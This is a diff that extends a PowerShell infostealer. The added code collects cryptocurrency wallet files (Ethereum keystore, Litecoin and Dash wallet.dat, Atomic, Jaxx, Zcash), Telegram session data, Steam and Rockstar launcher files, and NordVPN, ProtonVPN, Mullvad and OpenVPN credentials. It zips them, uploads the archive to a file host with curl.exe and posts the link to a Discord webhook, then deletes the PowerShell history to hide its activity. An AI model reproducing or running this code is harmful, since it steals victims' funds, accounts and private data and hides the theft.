@@ -369,12 +369,95 @@ if (Test-Path $path -PathType Any) {
 	Copy-Item "$env:appdata/Armory" "$env:tmp/$FolderName/Crypto/Armory" -Recurse
 }
 
+# AtomicWallet
+$path="$env:appdata/atomic"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/atomic" -ItemType Directory
+	Copy-Item "$env:appdata/atomic" "$env:tmp/$FolderName/Crypto/atomic" -Recurse
+}
+
+# Ethereum
+$path="$env:appdata/Ethereum/keystore"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/Ethereum" -ItemType Directory
+	Copy-Item "$env:appdata/Ethereum/keystore" "$env:tmp/$FolderName/Crypto/Ethereum/keystore" -Recurse
+}
+
+# Jaxx
+$path="$env:appdata/com.liberty.jaxx/IndexedDB"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/Jaxx" -ItemType Directory
+	Copy-Item "$env:appdata/com.liberty.jaxx/IndexedDB" "$env:tmp/$FolderName/Crypto/Jaxx/IndexedDB" -Recurse
+}
+
+# Zcash
+$path="$env:appdata/Zcash"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/Zcash" -ItemType Directory
+	Copy-Item "$env:appdata/Zcash" "$env:tmp/$FolderName/Crypto/Zcash" -Recurse
+}
+
+# ByteCoin
+$path="$env:appdata/bytecoin"
+if (Test-Path $path -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/bytecoin" -ItemType Directory
+	Copy-Item "$env:appdata/bytecoin" "$env:tmp/$FolderName/Crypto/bytecoin" -Recurse
+}
+
 # Monero
 $documents=[Environment]::GetFolderPath("MyDocuments")
 $path="$documents\Monero\wallets"
 if (Test-Path $path -PathType Any) {
 	New-Item -Path "$env:tmp/$FolderName/Crypto/Monero" -ItemType Directory
 	Copy-Item "$documents\Monero\wallets" "$env:tmp/$FolderName/Crypto/Monero" -Recurse
+}
+
+# LiteCoin
+function get-LiteCoin {
+	try {
+	$data = Get-ItemProperty -Path "HKCU:\Software\Litecoin\Litecoin-Qt" 
+	$wallet = $data | Select-Object strDataDir | Out-String
+	$wallet = Get-Content "$wallet\wallet.dat"
+	
+	}
+
+	catch {
+	Write-Error "No litecoin path found!"
+	return $null
+	-ErrorAction SilentlyContinue
+	}
+	
+	return $wallet
+}
+
+$wallet = get-LiteCoin
+if ($wallet -ne $null) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/Litecoin" -ItemType Directory
+	$wallet >> $env:tmp/$FolderName/Crypto/Litecoin/wallet.dat
+}
+
+# DashCore
+function get-DashCore {
+	try {
+	$data = Get-ItemProperty -Path "HKCU:\Software\Dash\Dash-Qt" 
+	$wallet = $data | Select-Object strDataDir | Out-String
+	$wallet = Get-Content "$wallet\wallet.dat"
+	
+	}
+
+	catch {
+	Write-Error "No dashcore path found!"
+	return $null
+	-ErrorAction SilentlyContinue
+	}
+	
+	return $wallet
+}
+
+$wallet = get-DashCore
+if ($wallet -ne $null) {
+	New-Item -Path "$env:tmp/$FolderName/Crypto/DashCore" -ItemType Directory
+	$wallet >> $env:tmp/$FolderName/Crypto/DashCore/wallet.dat
 }
 
 Compress-Archive -Path $env:tmp/$FolderName/Crypto -DestinationPath "$env:tmp/Crypto-$ZIP"
@@ -458,6 +541,10 @@ if (Test-Path "$env:appdata/Telegram Desktop/log.txt" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/Socials/Telegram -ItemType Directory
 	Copy-Item "$env:appdata/Telegram Desktop/log.txt" "$env:tmp\$FolderName\Socials\Telegram\log.txt"
 }
+if (Test-Path "$env:appdata/Telegram Desktop/tdata" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/Socials/Telegram -ItemType Directory
+	Copy-Item "$env:appdata/Telegram Desktop/tdata" "$env:tmp\$FolderName\Socials\Telegram\tdata" -recurse
+}
 
 # Keybase
 if (Test-Path "$env:appdata/../Local/Keybase/config.json" -PathType Any) {
@@ -496,6 +583,20 @@ if ([System.IO.File]::Exists("$env:appdata/Battle.net/Battle.net.config")) {
 	Copy-Item "$env:appdata/Battle.net/Battle.net.config" "$env:tmp/$FolderName/Gaming/BattleNet/Battle.net.config"
 }
 
+# NationsGlory
+if (Test-Path "$env:appdata/NationsGlory/Local Storage" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/Gaming/NationsGlory -ItemType Directory
+	Copy-Item "$env:appdata/NationsGlory/Local Storage" "$env:tmp/$FolderName/Gaming/NationsGlory/Local Storage"
+}
+
+# RockstarLauncher
+if (Test-Path  "$env:appdata/../Local/Rockstar Games/Launcher" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/Gaming/RockstarGames -ItemType Directory
+	Copy-Item "$env:appdata/../Local/Rockstar Games/settings_user.dat" "$env:tmp/$FolderName/Gaming/RockstarGames/settings_user.dat"
+	Copy-Item "$env:appdata/../Local/Rockstar Games/manifest_launcher_dev_340.xml" "$env:tmp/$FolderName/Gaming/RockstarGames/manifest_launcher_dev_340.xml"
+	Copy-Item "$env:appdata/../Local/Rockstar Games/manifest_launcher_dev_376.xml" "$env:tmp/$FolderName/Gaming/RockstarGames/manifest_launcher_dev_376.xml"
+}
+
 # Ubisoft
 if (Test-Path "$env:appdata/../Local/Ubisoft Game Launcher" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/Gaming/BattleNet -ItemType Directory
@@ -523,6 +624,28 @@ function get-RobloxCookies {
 $roblox = get-RobloxCookies
 if ($roblox -ne $null) {
 	$roblox >> $env:tmp/$FolderName/Gaming/RobloxCookies.txt
+}
+
+# Steam
+function get-SteamPath {
+	try {
+	$steam = Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" 
+	$path= $steam | Select-Object SteamPath | Out-String
+	}
+
+	catch {
+	Write-Error "No steam reg found!"
+	return $null
+	-ErrorAction SilentlyContinue
+	}
+	
+	return $path
+}
+
+$path = get-SteamPath
+if ($path -ne $null) {
+	New-Item -Path $env:tmp/$FolderName/Gaming/Steam -ItemType Directory
+	Copy-Item "$path/config" "env:tmp/$FolderName/Gaming/Steam/config" -Recurse
 }
 
 # Fortnite
@@ -619,6 +742,58 @@ Remove-Item "$env:TEMP\Gaming-$ZIP" -r -Force -ErrorAction SilentlyContinue
 # Delete powershell history periodically
 
 Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+############################################################################################################################################################
+
+New-Item -Path "$env:tmp/$FolderName/VPN" -ItemType Directory
+
+# NordVPN
+$NordVPN = Get-Childitem -Path $env:appdata\..\Local\NordVPN -Include user.config -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+if ($NordVPN -ne $null) {
+	New-Item -Path $env:tmp/$FolderName/VPN/NordVPN -ItemType Directory
+	Get-Content -Path $NordVPN >> $env:tmp/$FolderName/VPN/NordVPN/user.config
+}
+
+# MullvadVPN
+if (Test-Path "$env:appdata/../Local/Mullvad VPN" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/VPN/MullvadVPN -ItemType Directory
+	Copy-Item "$env:appdata/../Local/Mullvad VPN" "env:tmp/$FolderName/VPN/MullvadVPN" -Recurse
+}
+
+# ProtonVPN
+$ProtonVPN = Get-Childitem -Path $env:appdata\..\Local\ProtonVPN -Include user.config -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+if ($ProtonVPN -ne $null) {
+	New-Item -Path $env:tmp/$FolderName/VPN/ProtonVPN -ItemType Directory
+	Get-Content -Path $ProtonVPN >> $env:tmp/$FolderName/VPN/ProtonVPN/user.config
+}
+
+# OpenVPN
+if (Test-Path "$env:appdata/OpenVPN Connect/profiles" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/VPN/OpenVPN -ItemType Directory
+	Copy-Item "$env:appdata/OpenVPN Connect/profiles" "env:tmp/$FolderName/VPN/OpenVPN" -Recurse
+}
+
+Compress-Archive -Path $env:tmp/$FolderName/VPN -DestinationPath "$env:tmp/VPN-$ZIP"
+
+$text = "**VPN**: Loot captured! Here is the URL (It expires in 12 hours): "
+$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/VPN-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
+  'content' = $text
+}
+
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+
+Remove-Item "$env:TEMP\$FolderName\VPN" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\VPN-$ZIP" -r -Force -ErrorAction SilentlyContinue
+
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
 
 ############################################################################################################################################################
 
